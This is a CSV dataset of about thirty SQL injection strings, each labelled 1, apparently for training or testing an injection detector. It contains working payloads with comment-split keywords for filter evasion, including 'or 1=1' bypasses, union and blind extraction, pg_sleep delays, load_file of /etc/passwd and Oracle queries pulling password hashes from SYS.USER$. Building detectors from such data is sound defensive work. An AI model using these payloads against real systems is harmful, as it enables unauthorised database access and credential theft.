Query,Label
""" o/**/r pg_sleep  (  __TIME__  )  --",1
creat/**/e user name identified b/**/y pass123 tempo/**/rary t/**/ablespace temp default ta/**/blespace users;,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  t/**/able_name  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  t/**/able_name  )  , ROWNUM AS LI/**/MIT F/**/ROM sys.all_tab/**/les  )   WHER/**/E LIM/**/IT  =  5   )    )    A/**/ND 'i'  =  'i",1
" selec/**/t * fr/**/om users whe/**/re id  =  '1' o/**/r @ @1  =  1 un/**/ion se/**/lect 1,version  (    )   -- 1'",1
" s/**/elect * f/**/rom users w/**/here id  =  1 o/**/r 1#""  (   uni/**/on sele/**/ct 1,version  (    )   -- 1",1
 se/**/lect name f/**/rom syscolumns wher/**/e id   =     (  sele/**/ct id fro/**/m sysobjects w/**/here name   =   tab/**/lename'  )  --,1
s/**/elect * f/**/rom users whe/**/re id  =  1 +$+ o/**/r 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" s/**/elect * fro/**/m users whe/**/re id  =  '1' o/**/r ||/1  =  1 un/**/ion sele/**/ct 1,version  (    )   -- 1'",1
" sele/**/ct * fro/**/m users whe/**/re id  =  '1' o/**/r \.<\ un/**/ion selec/**/t 1,@@VERSION -- 1'",1
? o/**/r 1  =  1 --,1
 )   o/**/r   (  'a'  =  'a,1
admi/**/n' o/**/r 1  =  1#,1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 o/**/r ""  (  ]"" o/**/r 1  =  1 -- 1",1
o/**/r 1  =  1 --,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  column_name  )   FR/**/OM   (  SE/**/LECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FRO/**/M all_tab_columns  )   WHER/**/E LIM/**/IT  =  5   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * fro/**/m users wher/**/e id  =  '1' %!<@ u/**/nion sel/**/ect 1,version  (    )   -- 1'",1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r ""&  (  "" o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r ""?  (  "" o/**/r 1  =  1 -- 1",1
di/**/sti/**/nct,1
s/**/elect * fro/**/m users wher/**/e id  =  '1' *  (  \  )   o/**/r 1  =  1 -- 1',1
"1 an/**/d a/**/scii  (  lower  (  substri/**/ng   (    (   se/**/lect top 1 name fr/**/om sysobjects wh/**/ere xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r \.<\ o/**/r 1  =  1 -- 1,1
"admi/**/n"" o/**/r ""1""  =  ""1""--",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r ""%{"" o/**/r 1  =  1 -- 1",1
i/**/nser/**/t,1
" selec/**/t * fro/**/m users w/**/here id  =  1 o/**/r 1#""?  =  1 o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users w/**/here id  =  1 o/**/r ""%?"" o/**/r 1  =  1 -- 1",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LIM/**/IT FR/**/OM SYS.USER$  )   WHE/**/RE LI/**/MIT  =  8   )    )    A/**/ND 'i'  =  'i",1
" sele/**/ct * fr/**/om users w/**/here id  =  1 o/**/r ""?#"" o/**/r 1  =  1 -- 1",1
